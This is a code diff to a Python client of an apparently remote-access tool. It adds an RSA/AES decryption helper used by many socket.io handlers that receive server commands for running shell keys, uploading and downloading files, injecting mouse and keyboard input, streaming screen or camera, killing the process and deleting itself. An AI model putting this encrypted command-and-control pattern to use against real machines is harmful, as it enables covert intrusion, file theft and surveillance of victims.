@@ -96,6 +96,33 @@ def encrypt(public_key, message):
     encrypted_message = encrypted_aes_key + iv + ciphertext
     return encrypted_message
 
+def decrypt_with_client_key(private_key, encrypted_data):
+    # Step 1: Separate the encrypted AES key, IV, and ciphertext
+    encrypted_aes_key = encrypted_data[:256]  # RSA-encrypted AES key (2048 bits = 256 bytes)
+    iv = encrypted_data[256:272]  # The IV is 16 bytes long
+    ciphertext = encrypted_data[272:]  # The rest is the AES-encrypted message
+
+    # Step 2: Decrypt the AES key using RSA (private key)
+    aes_key = private_key.decrypt(
+        encrypted_aes_key,
+        asym_padding.OAEP(
+            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+
+    # Step 3: Decrypt the message using AES
+    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
+    decryptor = cipher.decryptor()
+    padded_data = decryptor.update(ciphertext) + decryptor.finalize()
+
+    # Unpad the data
+    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
+    message = unpadder.update(padded_data) + unpadder.finalize()
+
+    return message.decode('utf-8')
+
 
 # Platform check for GUI libraries
 if os.environ.get('DISPLAY', '') == '' and sys.platform != 'win32':
@@ -231,7 +258,7 @@ def run(data, private_key):
 
     @sio.on("command")
     def command(data_new):
-        data_new = json.loads(decrypt(private_key, data_new))
+        data_new = json.loads(decrypt_with_client_key(private_key, data_new))
         if data["uid"] == data_new["uid"]:
             key = data_new["key"]
             print(key)
@@ -244,7 +271,7 @@ def run(data, private_key):
 
     @sio.on("restart")
     def restart(data_new):
-        data_new = json.loads(decrypt(private_key, data_new))
+        data_new = json.loads(decrypt_with_client_key(private_key, data_new))
         if data["uid"] == data_new["uid"]:
             key = data_new["key"]
             if key in shells:
@@ -270,7 +297,7 @@ def run(data, private_key):
 
     @sio.on("upload_file")
     def upload_file(data_new):
-        data_new = json.loads(decrypt(private_key, data_new))
+        data_new = json.loads(decrypt_with_client_key(private_key, data_new))
         if data["uid"] == data_new["uid"]:
             print(data_new["file_name"])
             with open(data_new["file_name"], "wb") as f:
@@ -280,7 +307,7 @@ def run(data, private_key):
 
     @sio.on("download_file")
     def download_file(data_new):
-        data_new = json.loads(decrypt(private_key, data_new))
+        data_new = json.loads(decrypt_with_client_key(private_key, data_new))
         if data["uid"] == data_new["uid"]:
             with open(data_new["file_path"], "rb") as f:
                 file = f.read()
@@ -298,7 +325,7 @@ def run(data, private_key):
 
     @sio.on("pem")
     def pem(data_new):
-        data_new = json.loads(decrypt(private_key, data_new))
+        data_new = json.loads(decrypt_with_client_key(private_key, data_new))
         if data["uid"] == data_new["uid"]:
             print(data["url"]+ "pem/" + data_new["url"])
             def run_in_thread():
@@ -313,7 +340,7 @@ def run(data, private_key):
 
     @sio.on("kill")
     def kill(data_new):
-        data_new = json.loads(decrypt(private_key, data_new))
+        data_new = json.loads(decrypt_with_client_key(private_key, data_new))
         if data["uid"] == data_new["uid"]:
             PID = os.getpid()
             if platform.system() == 'Windows':
@@ -342,7 +369,7 @@ def run(data, private_key):
 
     @sio.on("delete")
     def delete(data_new):
-        data_new = json.loads(decrypt(private_key, data_new))
+        data_new = json.loads(decrypt_with_client_key(private_key, data_new))
         if data["uid"] == data_new["uid"]:
             user = getpass.getuser()
             if platform.system() == "Windows":
@@ -369,7 +396,7 @@ def run(data, private_key):
 
     @sio.on("mouse_input")
     def mouse_input(data_new):
-        data_new = json.loads(decrypt(private_key, data_new))
+        data_new = json.loads(decrypt_with_client_key(private_key, data_new))
         if data["uid"] == data_new["uid"]:
             print(data_new['x'], data_new['y'])
             if os.environ.get('DISPLAY', '') == '' and sys.platform != 'win32':
@@ -391,7 +418,7 @@ def run(data, private_key):
     # Mouse click adjustment based on active screen
     @sio.on("mouse_click")
     def mouse_click(data_new):
-        data_new = json.loads(decrypt(private_key, data_new))
+        data_new = json.loads(decrypt_with_client_key(private_key, data_new))
         if data["uid"] == data_new["uid"]:
             if os.environ.get('DISPLAY', '') == '' and sys.platform != 'win32':
                 print("No display found, skipping GUI libraries.")
@@ -407,7 +434,7 @@ def run(data, private_key):
     # Right mouse click adjustment based on active screen
     @sio.on("mouse_click_right")
     def mouse_click(data_new):
-        data_new = json.loads(decrypt(private_key, data_new))
+        data_new = json.loads(decrypt_with_client_key(private_key, data_new))
         if data["uid"] == data_new["uid"]:
             if os.environ.get('DISPLAY', '') == '' and sys.platform != 'win32':
                 print("No display found, skipping GUI libraries.")
@@ -422,7 +449,7 @@ def run(data, private_key):
 
     @sio.on("key_press")
     def key_press(data_new):
-        data_new = json.loads(decrypt(private_key, data_new))
+        data_new = json.loads(decrypt_with_client_key(private_key, data_new))
         if data["uid"] == data_new["uid"]:
             print(data_new)
             if os.environ.get('DISPLAY', '') == '' and sys.platform != 'win32':
@@ -435,7 +462,7 @@ def run(data, private_key):
 
     @sio.on("key_press_short")
     def key_press_short(data_new):
-        data_new = json.loads(decrypt(private_key, data_new))
+        data_new = json.loads(decrypt_with_client_key(private_key, data_new))
         if data["uid"] == data_new["uid"]:
             print(data_new)
             if os.environ.get('DISPLAY', '') == '' and sys.platform != 'win32':
@@ -445,7 +472,7 @@ def run(data, private_key):
 
     @sio.on("mouse_scroll")
     def mouse_scroll(data_new):
-        data_new = json.loads(decrypt(private_key, data_new))
+        data_new = json.loads(decrypt_with_client_key(private_key, data_new))
         if data["uid"] == data_new["uid"]:
             if os.environ.get('DISPLAY', '') == '' and sys.platform != 'win32':
                 print("No display found, skipping GUI libraries.")
@@ -454,7 +481,7 @@ def run(data, private_key):
 
     @sio.on("switch_screen")
     def switch_screen(data_new):
-        data_new = json.loads(decrypt(private_key, data_new))
+        data_new = json.loads(decrypt_with_client_key(private_key, data_new))
         global screen_or_camera
         if data["uid"] == data_new["uid"]:
             screen_or_camera = data_new["screen"]
@@ -471,7 +498,7 @@ def run(data, private_key):
 
     @sio.on("change_screen_number")
     def change_screen_number(data_new):
-        data_new = json.loads(decrypt(private_key, data_new))
+        data_new = json.loads(decrypt_with_client_key(private_key, data_new))
         global screen_number
         if data["uid"] == data_new["uid"]:
             screen_number = int(data_new['screenNumber'])
@@ -489,7 +516,7 @@ def run(data, private_key):
 
     @sio.on("change_screen_information")
     def change_screen_information(data_new):
-        data_new = json.loads(decrypt(private_key, data_new))
+        data_new = json.loads(decrypt_with_client_key(private_key, data_new))
         global screen_fps
         global screen_qualtiy
 
@@ -583,7 +610,7 @@ def run(data, private_key):
 
     @sio.on("screen_status")
     def screen_status(data_new):
-        data_new = json.loads(decrypt(private_key, data_new))
+        data_new = json.loads(decrypt_with_client_key(private_key, data_new))
         if data["uid"] == data_new["uid"]:
             if data_new["status"] == "start":
                 stop_event.clear()  # Reset the event to False
@@ -609,7 +636,7 @@ def run(data, private_key):
 
     @sio.on("recover")            
     def recover(data_new):
-        data_new = json.loads(decrypt(private_key, data_new))
+        data_new = json.loads(decrypt_with_client_key(private_key, data_new))
         if data['uid'] == data_new['uid']:
             sio.disconnect()
             try:
